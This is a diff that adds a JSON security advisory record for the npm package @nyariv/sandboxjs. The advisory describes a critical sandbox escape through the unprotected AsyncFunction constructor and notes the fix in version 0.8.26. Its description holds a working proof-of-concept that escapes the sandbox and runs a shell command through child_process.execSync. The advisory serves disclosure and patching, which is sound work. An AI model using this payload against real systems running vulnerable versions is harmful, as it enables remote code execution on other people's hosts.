@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-01-27T19:55:12Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 334376,
+    "Id": "GSA_kwCzR0hTQS13eGh3LWo0aGMtZm1xNs4ABRoo",
+    "GhsaId": "GHSA-wxhw-j4hc-fmq6",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-wxhw-j4hc-fmq6"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/345aee6566e47979dee5c337b925b141e7f78ccd"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-wxhw-j4hc-fmq6"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-wxhw-j4hc-fmq6"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-23830"
+      }
+    ],
+    "Description": "### Summary\nA sandbox escape vulnerability due to `AsyncFunction` not being isolated in `SandboxFunction`\n\n### Details\n\nThe library attempts to sandbox code execution by replacing the global `Function` constructor with a safe, sandboxed version (`SandboxFunction`). This is handled in `utils.ts` by mapping `Function` to `sandboxFunction` within a map used for lookups.\n\nHowever, the library did not include mappings for `AsyncFunction`, `GeneratorFunction`, and `AsyncGeneratorFunction`. These constructors are not global properties but can be accessed via the `.constructor` property of an instance (e.g., `(async () =\u003e {}).constructor`).\n\nIn `executor.ts`, property access is handled. When code running inside the sandbox accesses `.constructor` on an async function (which the sandbox allows creating), the `executor` retrieves the property value. Since `AsyncFunction` was not in the safe-replacement map, the `executor` returns the actual native host `AsyncFunction` constructor.\n\nConstructors for functions in JavaScript (like `Function`, `AsyncFunction`) create functions that execute in the global scope. By obtaining the host `AsyncFunction` constructor, an attacker can create a new async function that executes entirely outside the sandbox context, bypassing all restrictions and gaining full access to the host environment (Remote Code Execution).\n\n### PoC\n\n```js\nconst sandbox = require('@nyariv/sandboxjs');\nconst s = new sandbox.default();\n\nconst payload = `\n    const af = async () =\u003e {};\n    // .constructor returns the host AsyncFunction constructor because it's not intercepted\n    const AsyncConstructor = af.constructor;\n    console.log(\"AsyncConstructor name:\", AsyncConstructor.name);\n    \n    // Create a function that executes outside the sandbox\n    const func = AsyncConstructor(\"return process.mainModule.require('child_process').execSync('id').toString()\");\n    \n    // Execute RCE\n    const p = func();\n    p.then(proc =\u003e {\n        console.log(proc);\n    });\n`;\n\ntry {\n    s.compile(payload)().run();\n} catch (e) {\n    console.error(\"Bypass failed:\", e.message);\n}\n```\n\nRun above script in nodejs. If you run it in browser, change the `AsyncConstructor` argument by returning `window` object. \n\n### Impact\n\nA Remote Code Execution, attacker may be able to run an arbitrary code.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-27T19:55:11Z",
+    "Severity": "CRITICAL",
+    "Summary": "SandboxJS has Sandbox Escape via Unprotected AsyncFunction Constructor",
+    "UpdatedAt": "2026-01-27T19:55:12Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.26"
+      },
+      "VulnerableVersionRange": "\u003c 0.8.26"
+    }
+  ]
+}
